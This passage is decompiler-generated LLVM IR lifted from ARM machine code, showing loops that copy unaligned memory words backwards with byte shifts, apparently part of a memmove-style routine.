  %v0_15cd4 = phi i32 [ %v2_15b04, %dec_label_pc_15b14 ], [ %v2_15bd0, %dec_label_pc_15bd8 ]
  %v0_15be0 = phi i32 [ %v2_15afc, %dec_label_pc_15b14 ], [ %v0_15bd8, %dec_label_pc_15bd8 ]
  %v0_15be8 = phi i32 [ %v1_15b14, %dec_label_pc_15b14 ], [ %v1_15bd8, %dec_label_pc_15bd8 ]
  %v1_15be0 = and i32 %v0_15be0, -4
  store i32 %v1_15be0, i32* %r1.global-to-local, align 4
  %v1_15be4 = inttoptr i32 %v1_15be0 to i32*
  %v2_15be4 = load i32, i32* %v1_15be4, align 4
  store i32 %v2_15be4, i32* %r3.global-to-local, align 4
  %v7_15be8 = icmp ult i32 %v0_15be8, 2
  %v2_15ccc = add i32 %v0_15cd4, -12
  %v4_15ccc = sub i32 11, %v0_15cd4
  %v5_15ccc = and i32 %v4_15ccc, %v0_15cd4
  %v6_15ccc = icmp slt i32 %v5_15ccc, 0
  store i1 %v6_15ccc, i1* %cpsr_v.global-to-local, align 1
  %v7_15ccc = icmp slt i32 %v2_15ccc, 0
  store i1 %v7_15ccc, i1* %cpsr_n.global-to-local, align 1
  %v8_15ccc = icmp eq i32 %v0_15cd4, 12
  store i1 %v8_15ccc, i1* %cpsr_z.global-to-local, align 1
  %v5_15cd0 = icmp slt i32 %v0_15cd4, 12
  br i1 %v7_15be8, label %dec_label_pc_15ccc, label %dec_label_pc_15bf0

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15be0
  %v8_15be8 = icmp eq i32 %v0_15be8, 2
  br i1 %v8_15be8, label %dec_label_pc_15c60, label %dec_label_pc_15bf4

dec_label_pc_15bf4:                               ; preds = %dec_label_pc_15bf0
  br i1 %v5_15cd0, label %dec_label_pc_15c40, label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %dec_label_pc_15bf4
  store i32 %v2_15ccc, i32* %r2.global-to-local, align 4
  %v3_15c00 = load i32, i32* @r4, align 4
  store i32 %v3_15c00, i32* %stack_var_-12, align 4
  %v6_15c00 = load i32, i32* @r5, align 4
  store i32 %v6_15c00, i32* %stack_var_-8, align 4
  %v9_15c00 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15c04

dec_label_pc_15c04:                               ; preds = %dec_label_pc_15c04.dec_label_pc_15c04_crit_edge, %dec_label_pc_15bfc
  %v0_15c28 = phi i32 [ %v1_15c28, %dec_label_pc_15c04.dec_label_pc_15c04_crit_edge ], [ %v0_15c2830, %dec_label_pc_15bfc ]
  %v0_15c08 = phi i32 [ %v0_15c08.pre, %dec_label_pc_15c04.dec_label_pc_15c04_crit_edge ], [ %v1_15be0, %dec_label_pc_15bfc ]
  %v0_15c04 = phi i32 [ %v0_15c04.pre, %dec_label_pc_15c04.dec_label_pc_15c04_crit_edge ], [ %v2_15be4, %dec_label_pc_15bfc ]
  %v3_15c04 = mul i32 %v0_15c04, 256
  store i32 %v3_15c04, i32* %lr.global-to-local, align 4
  %v1_15c08 = add i32 %v0_15c08, -4
  %v2_15c08 = inttoptr i32 %v1_15c08 to i32*
  %v3_15c08 = load i32, i32* %v2_15c08, align 4
  store i32 %v3_15c08, i32* %r3.global-to-local, align 4
  %v4_15c08 = add i32 %v0_15c08, -8
  %v5_15c08 = inttoptr i32 %v4_15c08 to i32*
  %v6_15c08 = load i32, i32* %v5_15c08, align 4
  store i32 %v6_15c08, i32* %r4.global-to-local, align 4
  %v7_15c08 = add i32 %v0_15c08, -12
  %v8_15c08 = inttoptr i32 %v7_15c08 to i32*
  %v9_15c08 = load i32, i32* %v8_15c08, align 4
  store i32 %v9_15c08, i32* %r5.global-to-local, align 4
  %v10_15c08 = add i32 %v0_15c08, -16
  %v11_15c08 = inttoptr i32 %v10_15c08 to i32*
  %v12_15c08 = load i32, i32* %v11_15c08, align 4
  store i32 %v10_15c08, i32* %r1.global-to-local, align 4
  %v4_15c0c = udiv i32 %v12_15c08, 16777216
  %v5_15c0c = or i32 %v4_15c0c, %v3_15c04
  store i32 %v5_15c0c, i32* %lr.global-to-local, align 4
  %v3_15c10 = mul i32 %v12_15c08, 256
  %v4_15c14 = udiv i32 %v9_15c08, 16777216
  %v5_15c14 = or i32 %v3_15c10, %v4_15c14
  store i32 %v5_15c14, i32* @ip, align 4
  %v3_15c18 = mul i32 %v9_15c08, 256
  %v4_15c1c = udiv i32 %v6_15c08, 16777216
  %v5_15c1c = or i32 %v3_15c18, %v4_15c1c
  store i32 %v5_15c1c, i32* %r5.global-to-local, align 4
  %v3_15c20 = mul i32 %v6_15c08, 256
  %v4_15c24 = udiv i32 %v3_15c08, 16777216
  %v5_15c24 = or i32 %v3_15c20, %v4_15c24
  store i32 %v5_15c24, i32* %r4.global-to-local, align 4
  %v1_15c28 = add i32 %v0_15c28, -16
  %v2_15c28 = inttoptr i32 %v1_15c28 to i32*
  store i32 %v5_15c24, i32* %v2_15c28, align 4
  %v4_15c28 = add i32 %v0_15c28, -12
  %v5_15c28 = inttoptr i32 %v4_15c28 to i32*
  %v6_15c28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15c28, i32* %v5_15c28, align 4
  %v7_15c28 = add i32 %v0_15c28, -8
  %v8_15c28 = inttoptr i32 %v7_15c28 to i32*
  %v9_15c28 = load i32, i32* @ip, align 4
  store i32 %v9_15c28, i32* %v8_15c28, align 4
  %v10_15c28 = add i32 %v0_15c28, -4
  %v11_15c28 = inttoptr i32 %v10_15c28 to i32*
  %v12_15c28 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15c28, i32* %v11_15c28, align 4
  store i32 %v1_15c28, i32* %r0.global-to-local, align 4
  %v0_15c2c = load i32, i32* %r2.global-to-local, align 4
  %v2_15c2c = add i32 %v0_15c2c, -16
  store i32 %v2_15c2c, i32* %r2.global-to-local, align 4
  %v6_15c30 = icmp slt i32 %v0_15c2c, 16
  br i1 %v6_15c30, label %dec_label_pc_15c34, label %dec_label_pc_15c04.dec_label_pc_15c04_crit_edge

dec_label_pc_15c04.dec_label_pc_15c04_crit_edge:  ; preds = %dec_label_pc_15c04
  %v0_15c04.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15c08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c04

dec_label_pc_15c34:                               ; preds = %dec_label_pc_15c04
  %v2_15c34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c34, i32* @r4, align 4
  %v5_15c34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15c34, i32* @r5, align 4
  store i32 %v9_15c00, i32* @lr, align 4
  %v2_15c38 = add i32 %v0_15c2c, -4
  store i32 %v2_15c38, i32* %r2.global-to-local, align 4
  %v4_15c38 = add i32 %v0_15c2c, 2147483632
  %v5_15c38 = and i32 %v2_15c38, %v4_15c38
  %v6_15c38 = icmp slt i32 %v5_15c38, 0
  store i1 %v6_15c38, i1* %cpsr_v.global-to-local, align 1
  %v7_15c38 = icmp slt i32 %v2_15c38, 0
  store i1 %v7_15c38, i1* %cpsr_n.global-to-local, align 1
  %v8_15c38 = icmp eq i32 %v2_15c38, 0
  store i1 %v8_15c38, i1* %cpsr_z.global-to-local, align 1
  %v5_15c3c = icmp slt i32 %v2_15c2c, -12
  br i1 %v5_15c3c, label %dec_label_pc_15c58, label %dec_label_pc_15c40

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c34, %dec_label_pc_15bf4, %dec_label_pc_15c40
  %v1_15c4c = phi i32 [ %v5_15c4c, %dec_label_pc_15c40 ], [ %v1_15c28, %dec_label_pc_15c34 ], [ %v0_15c2830, %dec_label_pc_15bf4 ]
  %v0_15c40 = load i32, i32* %r3.global-to-local, align 4
  %v3_15c40 = mul i32 %v0_15c40, 256
  store i32 %v3_15c40, i32* %ip.global-to-local, align 4
  %v0_15c44 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c44 = add i32 %v0_15c44, -4
  %v2_15c44 = inttoptr i32 %v1_15c44 to i32*
  %v3_15c44 = load i32, i32* %v2_15c44, align 4
  store i32 %v3_15c44, i32* %r3.global-to-local, align 4
  store i32 %v1_15c44, i32* %r1.global-to-local, align 4
  %v4_15c48 = udiv i32 %v3_15c44, 16777216
  %v5_15c48 = or i32 %v4_15c48, %v3_15c40
  store i32 %v5_15c48, i32* @ip, align 4
  %v2_15c4c = add i32 %v1_15c4c, -4
  %v3_15c4c = inttoptr i32 %v2_15c4c to i32*
  store i32 %v5_15c48, i32* %v3_15c4c, align 4
  %v4_15c4c = load i32, i32* %r0.global-to-local, align 4
  %v5_15c4c = add i32 %v4_15c4c, -4
  store i32 %v5_15c4c, i32* %r0.global-to-local, align 4
  %v0_15c50 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c50 = add i32 %v0_15c50, -4
  store i32 %v2_15c50, i32* %r2.global-to-local, align 4
  %v6_15c54 = icmp slt i32 %v0_15c50, 4
  br i1 %v6_15c54, label %dec_label_pc_15c58.loopexit, label %dec_label_pc_15c40

dec_label_pc_15c58.loopexit:                      ; preds = %dec_label_pc_15c40
  %v4_15c50 = sub i32 3, %v0_15c50
  %v5_15c50 = and i32 %v4_15c50, %v0_15c50
  %v6_15c50 = icmp slt i32 %v5_15c50, 0
  %v7_15c50 = icmp slt i32 %v2_15c50, 0
  store i1 %v6_15c50, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c50, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c58.loopexit, %dec_label_pc_15c34
  %v2_15b9c62 = phi i32 [ %v5_15c4c, %dec_label_pc_15c58.loopexit ], [ %v1_15c28, %dec_label_pc_15c34 ]
  %v0_15b8c58 = phi i32 [ %v2_15c50, %dec_label_pc_15c58.loopexit ], [ %v2_15c38, %dec_label_pc_15c34 ]
  %v0_15c58 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c58 = add i32 %v0_15c58, 3
  store i32 %v1_15c58, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15bf0
  br i1 %v5_15cd0, label %dec_label_pc_15cac, label %dec_label_pc_15c68

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15c60
  store i32 %v2_15ccc, i32* %r2.global-to-local, align 4
  %v3_15c6c = load i32, i32* @r4, align 4
  store i32 %v3_15c6c, i32* %stack_var_-12, align 4
  %v6_15c6c = load i32, i32* @r5, align 4
  store i32 %v6_15c6c, i32* %stack_var_-8, align 4
  %v9_15c6c = load i32, i32* @lr, align 4
  br label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c70.dec_label_pc_15c70_crit_edge, %dec_label_pc_15c68
  %v0_15c94 = phi i32 [ %v1_15c94, %dec_label_pc_15c70.dec_label_pc_15c70_crit_edge ], [ %v0_15c2830, %dec_label_pc_15c68 ]
  %v0_15c74 = phi i32 [ %v0_15c74.pre, %dec_label_pc_15c70.dec_label_pc_15c70_crit_edge ], [ %v1_15be0, %dec_label_pc_15c68 ]
  %v0_15c70 = phi i32 [ %v0_15c70.pre, %dec_label_pc_15c70.dec_label_pc_15c70_crit_edge ], [ %v2_15be4, %dec_label_pc_15c68 ]
  %v3_15c70 = mul i32 %v0_15c70, 65536
  store i32 %v3_15c70, i32* %lr.global-to-local, align 4
  %v1_15c74 = add i32 %v0_15c74, -4
  %v2_15c74 = inttoptr i32 %v1_15c74 to i32*
  %v3_15c74 = load i32, i32* %v2_15c74, align 4
  store i32 %v3_15c74, i32* %r3.global-to-local, align 4
  %v4_15c74 = add i32 %v0_15c74, -8
  %v5_15c74 = inttoptr i32 %v4_15c74 to i32*
  %v6_15c74 = load i32, i32* %v5_15c74, align 4
  store i32 %v6_15c74, i32* %r4.global-to-local, align 4
  %v7_15c74 = add i32 %v0_15c74, -12
  %v8_15c74 = inttoptr i32 %v7_15c74 to i32*
  %v9_15c74 = load i32, i32* %v8_15c74, align 4
  store i32 %v9_15c74, i32* %r5.global-to-local, align 4
  %v10_15c74 = add i32 %v0_15c74, -16
  %v11_15c74 = inttoptr i32 %v10_15c74 to i32*
  %v12_15c74 = load i32, i32* %v11_15c74, align 4
  store i32 %v10_15c74, i32* %r1.global-to-local, align 4
  %v4_15c78 = udiv i32 %v12_15c74, 65536
  %v5_15c78 = or i32 %v4_15c78, %v3_15c70
  store i32 %v5_15c78, i32* %lr.global-to-local, align 4
  %v3_15c7c = mul i32 %v12_15c74, 65536
  %v4_15c80 = udiv i32 %v9_15c74, 65536
  %v5_15c80 = or i32 %v3_15c7c, %v4_15c80
  store i32 %v5_15c80, i32* @ip, align 4
  %v3_15c84 = mul i32 %v9_15c74, 65536
  %v4_15c88 = udiv i32 %v6_15c74, 65536
  %v5_15c88 = or i32 %v3_15c84, %v4_15c88
  store i32 %v5_15c88, i32* %r5.global-to-local, align 4
  %v3_15c8c = mul i32 %v6_15c74, 65536
  %v4_15c90 = udiv i32 %v3_15c74, 65536
  %v5_15c90 = or i32 %v3_15c8c, %v4_15c90
  store i32 %v5_15c90, i32* %r4.global-to-local, align 4
  %v1_15c94 = add i32 %v0_15c94, -16
  %v2_15c94 = inttoptr i32 %v1_15c94 to i32*
  store i32 %v5_15c90, i32* %v2_15c94, align 4
  %v4_15c94 = add i32 %v0_15c94, -12
  %v5_15c94 = inttoptr i32 %v4_15c94 to i32*
  %v6_15c94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15c94, i32* %v5_15c94, align 4
  %v7_15c94 = add i32 %v0_15c94, -8
  %v8_15c94 = inttoptr i32 %v7_15c94 to i32*
  %v9_15c94 = load i32, i32* @ip, align 4
  store i32 %v9_15c94, i32* %v8_15c94, align 4
  %v10_15c94 = add i32 %v0_15c94, -4
  %v11_15c94 = inttoptr i32 %v10_15c94 to i32*
  %v12_15c94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15c94, i32* %v11_15c94, align 4
  store i32 %v1_15c94, i32* %r0.global-to-local, align 4
  %v0_15c98 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c98 = add i32 %v0_15c98, -16
  store i32 %v2_15c98, i32* %r2.global-to-local, align 4
  %v6_15c9c = icmp slt i32 %v0_15c98, 16
  br i1 %v6_15c9c, label %dec_label_pc_15ca0, label %dec_label_pc_15c70.dec_label_pc_15c70_crit_edge

dec_label_pc_15c70.dec_label_pc_15c70_crit_edge:  ; preds = %dec_label_pc_15c70
  %v0_15c70.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15c74.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c70

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c70
  %v2_15ca0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ca0, i32* @r4, align 4
  %v5_15ca0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15ca0, i32* @r5, align 4
  store i32 %v9_15c6c, i32* @lr, align 4
  %v2_15ca4 = add i32 %v0_15c98, -4
  store i32 %v2_15ca4, i32* %r2.global-to-local, align 4
  %v4_15ca4 = add i32 %v0_15c98, 2147483632
  %v5_15ca4 = and i32 %v2_15ca4, %v4_15ca4
  %v6_15ca4 = icmp slt i32 %v5_15ca4, 0
  store i1 %v6_15ca4, i1* %cpsr_v.global-to-local, align 1
  %v7_15ca4 = icmp slt i32 %v2_15ca4, 0
  store i1 %v7_15ca4, i1* %cpsr_n.global-to-local, align 1
  %v8_15ca4 = icmp eq i32 %v2_15ca4, 0
  store i1 %v8_15ca4, i1* %cpsr_z.global-to-local, align 1
  %v5_15ca8 = icmp slt i32 %v2_15c98, -12
  br i1 %v5_15ca8, label %dec_label_pc_15cc4, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15ca0, %dec_label_pc_15c60, %dec_label_pc_15cac
  %v1_15cb8 = phi i32 [ %v5_15cb8, %dec_label_pc_15cac ], [ %v1_15c94, %dec_label_pc_15ca0 ], [ %v0_15c2830, %dec_label_pc_15c60 ]
  %v0_15cac = load i32, i32* %r3.global-to-local, align 4
  %v3_15cac = mul i32 %v0_15cac, 65536
  store i32 %v3_15cac, i32* %ip.global-to-local, align 4
  %v0_15cb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cb0 = add i32 %v0_15cb0, -4
  %v2_15cb0 = inttoptr i32 %v1_15cb0 to i32*
  %v3_15cb0 = load i32, i32* %v2_15cb0, align 4
  store i32 %v3_15cb0, i32* %r3.global-to-local, align 4
  store i32 %v1_15cb0, i32* %r1.global-to-local, align 4
  %v4_15cb4 = udiv i32 %v3_15cb0, 65536
  %v5_15cb4 = or i32 %v4_15cb4, %v3_15cac
  store i32 %v5_15cb4, i32* @ip, align 4
  %v2_15cb8 = add i32 %v1_15cb8, -4
  %v3_15cb8 = inttoptr i32 %v2_15cb8 to i32*
  store i32 %v5_15cb4, i32* %v3_15cb8, align 4
  %v4_15cb8 = load i32, i32* %r0.global-to-local, align 4
  %v5_15cb8 = add i32 %v4_15cb8, -4
  store i32 %v5_15cb8, i32* %r0.global-to-local, align 4
  %v0_15cbc = load i32, i32* %r2.global-to-local, align 4
  %v2_15cbc = add i32 %v0_15cbc, -4
  store i32 %v2_15cbc, i32* %r2.global-to-local, align 4
  %v6_15cc0 = icmp slt i32 %v0_15cbc, 4
  br i1 %v6_15cc0, label %dec_label_pc_15cc4.loopexit, label %dec_label_pc_15cac

dec_label_pc_15cc4.loopexit:                      ; preds = %dec_label_pc_15cac
  %v4_15cbc = sub i32 3, %v0_15cbc
  %v5_15cbc = and i32 %v4_15cbc, %v0_15cbc
  %v6_15cbc = icmp slt i32 %v5_15cbc, 0
  %v7_15cbc = icmp slt i32 %v2_15cbc, 0
  store i1 %v6_15cbc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15cbc, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cc4.loopexit, %dec_label_pc_15ca0
  %v2_15b9c63 = phi i32 [ %v5_15cb8, %dec_label_pc_15cc4.loopexit ], [ %v1_15c94, %dec_label_pc_15ca0 ]
  %v0_15b8c59 = phi i32 [ %v2_15cbc, %dec_label_pc_15cc4.loopexit ], [ %v2_15ca4, %dec_label_pc_15ca0 ]
  %v0_15cc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cc4 = add i32 %v0_15cc4, 2
  store i32 %v1_15cc4, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15be0
  br i1 %v5_15cd0, label %dec_label_pc_15d18, label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15ccc
  store i32 %v2_15ccc, i32* %r2.global-to-local, align 4
  %v3_15cd8 = load i32, i32* @r4, align 4
  store i32 %v3_15cd8, i32* %stack_var_-12, align 4
  %v6_15cd8 = load i32, i32* @r5, align 4
  store i32 %v6_15cd8, i32* %stack_var_-8, align 4
  %v9_15cd8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge, %dec_label_pc_15cd4
  %v0_15d00 = phi i32 [ %v1_15d00, %dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge ], [ %v0_15c2830, %dec_label_pc_15cd4 ]
  %v0_15ce0 = phi i32 [ %v0_15ce0.pre, %dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge ], [ %v1_15be0, %dec_label_pc_15cd4 ]
  %v0_15cdc = phi i32 [ %v0_15cdc.pre, %dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge ], [ %v2_15be4, %dec_label_pc_15cd4 ]
  %v3_15cdc = mul i32 %v0_15cdc, 16777216
  store i32 %v3_15cdc, i32* %lr.global-to-local, align 4
  %v1_15ce0 = add i32 %v0_15ce0, -4
  %v2_15ce0 = inttoptr i32 %v1_15ce0 to i32*
  %v3_15ce0 = load i32, i32* %v2_15ce0, align 4
  store i32 %v3_15ce0, i32* %r3.global-to-local, align 4
  %v4_15ce0 = add i32 %v0_15ce0, -8
  %v5_15ce0 = inttoptr i32 %v4_15ce0 to i32*
  %v6_15ce0 = load i32, i32* %v5_15ce0, align 4
  store i32 %v6_15ce0, i32* %r4.global-to-local, align 4
  %v7_15ce0 = add i32 %v0_15ce0, -12
  %v8_15ce0 = inttoptr i32 %v7_15ce0 to i32*
  %v9_15ce0 = load i32, i32* %v8_15ce0, align 4
  store i32 %v9_15ce0, i32* %r5.global-to-local, align 4
  %v10_15ce0 = add i32 %v0_15ce0, -16
  %v11_15ce0 = inttoptr i32 %v10_15ce0 to i32*
  %v12_15ce0 = load i32, i32* %v11_15ce0, align 4
  store i32 %v10_15ce0, i32* %r1.global-to-local, align 4
  %v4_15ce4 = udiv i32 %v12_15ce0, 256
  %v5_15ce4 = or i32 %v4_15ce4, %v3_15cdc
  store i32 %v5_15ce4, i32* %lr.global-to-local, align 4
  %v3_15ce8 = mul i32 %v12_15ce0, 16777216
  %v4_15cec = udiv i32 %v9_15ce0, 256
  %v5_15cec = or i32 %v3_15ce8, %v4_15cec
  store i32 %v5_15cec, i32* @ip, align 4
  %v3_15cf0 = mul i32 %v9_15ce0, 16777216
  %v4_15cf4 = udiv i32 %v6_15ce0, 256
  %v5_15cf4 = or i32 %v3_15cf0, %v4_15cf4
  store i32 %v5_15cf4, i32* %r5.global-to-local, align 4
  %v3_15cf8 = mul i32 %v6_15ce0, 16777216
  %v4_15cfc = udiv i32 %v3_15ce0, 256
  %v5_15cfc = or i32 %v3_15cf8, %v4_15cfc
  store i32 %v5_15cfc, i32* %r4.global-to-local, align 4
  %v1_15d00 = add i32 %v0_15d00, -16
  %v2_15d00 = inttoptr i32 %v1_15d00 to i32*
  store i32 %v5_15cfc, i32* %v2_15d00, align 4
  %v4_15d00 = add i32 %v0_15d00, -12
  %v5_15d00 = inttoptr i32 %v4_15d00 to i32*
  %v6_15d00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15d00, i32* %v5_15d00, align 4
  %v7_15d00 = add i32 %v0_15d00, -8
  %v8_15d00 = inttoptr i32 %v7_15d00 to i32*
  %v9_15d00 = load i32, i32* @ip, align 4
  store i32 %v9_15d00, i32* %v8_15d00, align 4
  %v10_15d00 = add i32 %v0_15d00, -4
  %v11_15d00 = inttoptr i32 %v10_15d00 to i32*
  %v12_15d00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15d00, i32* %v11_15d00, align 4
  store i32 %v1_15d00, i32* %r0.global-to-local, align 4
  %v0_15d04 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d04 = add i32 %v0_15d04, -16
  store i32 %v2_15d04, i32* %r2.global-to-local, align 4
  %v6_15d08 = icmp slt i32 %v0_15d04, 16
  br i1 %v6_15d08, label %dec_label_pc_15d0c, label %dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge

dec_label_pc_15cdc.dec_label_pc_15cdc_crit_edge:  ; preds = %dec_label_pc_15cdc
  %v0_15cdc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15ce0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cdc
  %v2_15d0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d0c, i32* @r4, align 4
  %v5_15d0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15d0c, i32* @r5, align 4
  store i32 %v9_15cd8, i32* @lr, align 4
  %v2_15d10 = add i32 %v0_15d04, -4
  store i32 %v2_15d10, i32* %r2.global-to-local, align 4
  %v4_15d10 = add i32 %v0_15d04, 2147483632
  %v5_15d10 = and i32 %v2_15d10, %v4_15d10
  %v6_15d10 = icmp slt i32 %v5_15d10, 0
  store i1 %v6_15d10, i1* %cpsr_v.global-to-local, align 1
  %v7_15d10 = icmp slt i32 %v2_15d10, 0
  store i1 %v7_15d10, i1* %cpsr_n.global-to-local, align 1
  %v8_15d10 = icmp eq i32 %v2_15d10, 0
  store i1 %v8_15d10, i1* %cpsr_z.global-to-local, align 1
  %v5_15d14 = icmp slt i32 %v2_15d04, -12
  br i1 %v5_15d14, label %dec_label_pc_15d30, label %dec_label_pc_15d18

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d0c, %dec_label_pc_15ccc, %dec_label_pc_15d18
  %v1_15d24 = phi i32 [ %v5_15d24, %dec_label_pc_15d18 ], [ %v1_15d00, %dec_label_pc_15d0c ], [ %v0_15c2830, %dec_label_pc_15ccc ]
  %v0_15d18 = load i32, i32* %r3.global-to-local, align 4
  %v3_15d18 = mul i32 %v0_15d18, 16777216
  store i32 %v3_15d18, i32* %ip.global-to-local, align 4
  %v0_15d1c = load i32, i32* %r1.global-to-local, align 4
  %v1_15d1c = add i32 %v0_15d1c, -4
  %v2_15d1c = inttoptr i32 %v1_15d1c to i32*
  %v3_15d1c = load i32, i32* %v2_15d1c, align 4
  store i32 %v3_15d1c, i32* %r3.global-to-local, align 4
  store i32 %v1_15d1c, i32* %r1.global-to-local, align 4
  %v4_15d20 = udiv i32 %v3_15d1c, 256
  %v5_15d20 = or i32 %v4_15d20, %v3_15d18
  store i32 %v5_15d20, i32* @ip, align 4
  %v2_15d24 = add i32 %v1_15d24, -4
  %v3_15d24 = inttoptr i32 %v2_15d24 to i32*
  store i32 %v5_15d20, i32* %v3_15d24, align 4
  %v4_15d24 = load i32, i32* %r0.global-to-local, align 4
  %v5_15d24 = add i32 %v4_15d24, -4
  store i32 %v5_15d24, i32* %r0.global-to-local, align 4
  %v0_15d28 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d28 = add i32 %v0_15d28, -4
  store i32 %v2_15d28, i32* %r2.global-to-local, align 4
  %v6_15d2c = icmp slt i32 %v0_15d28, 4
  br i1 %v6_15d2c, label %dec_label_pc_15d30.loopexit, label %dec_label_pc_15d18

dec_label_pc_15d30.loopexit:                      ; preds = %dec_label_pc_15d18
  %v4_15d28 = sub i32 3, %v0_15d28
  %v5_15d28 = and i32 %v4_15d28, %v0_15d28
  %v6_15d28 = icmp slt i32 %v5_15d28, 0
  %v7_15d28 = icmp slt i32 %v2_15d28, 0
  store i1 %v6_15d28, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15d28, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d30.loopexit, %dec_label_pc_15d0c
  %v2_15b9c64 = phi i32 [ %v5_15d24, %dec_label_pc_15d30.loopexit ], [ %v1_15d00, %dec_label_pc_15d0c ]
  %v0_15b8c60 = phi i32 [ %v2_15d28, %dec_label_pc_15d30.loopexit ], [ %v2_15d10, %dec_label_pc_15d0c ]
  %v0_15d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d30 = add i32 %v0_15d30, 1
  store i32 %v1_15d30, i32* %r1.global-to-local, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_15d24, { 0, 2, 1 }
  uselistorder i32 %v3_15d18, { 1, 0 }
  uselistorder i32 %v2_15d10, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15d00, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15ce0, { 1, 0 }
  uselistorder i32 %v3_15cdc, { 1, 0 }
  uselistorder i32 %v0_15ce0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15d00, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15cb8, { 0, 2, 1 }
  uselistorder i32 %v3_15cac, { 1, 0 }
  uselistorder i32 %v2_15ca4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15c94, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15c74, { 1, 0 }
  uselistorder i32 %v3_15c70, { 1, 0 }
  uselistorder i32 %v0_15c74, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15c94, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15c4c, { 0, 2, 1 }
  uselistorder i32 %v3_15c40, { 1, 0 }
  uselistorder i32 %v2_15c38, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15c28, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15c08, { 1, 0 }
  uselistorder i32 %v3_15c04, { 1, 0 }
  uselistorder i32 %v0_15c08, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15c28, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15cd0, { 2, 0, 1 }
  uselistorder i32 %v0_15be8, { 1, 0 }
  uselistorder i32 %v0_15cd4, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15c2830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15bd8, { 2, 1, 0 }
  uselistorder i32 %v0_15bd8, { 2, 0, 1 }
  uselistorder i32 %v2_15bd0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15bd0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15bd0, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15c2831, { 2, 1, 0 }
  uselistorder i32 %v11_15bac, { 1, 0 }
  uselistorder i32 %v7_15bac, { 1, 0 }
  uselistorder i32 %v1_15b8c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15b8c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15b90, { 1, 0 }
  uselistorder i32 %v7_15b84, { 0, 2, 1 }
  uselistorder i32 %v10_15b80, { 1, 0 }
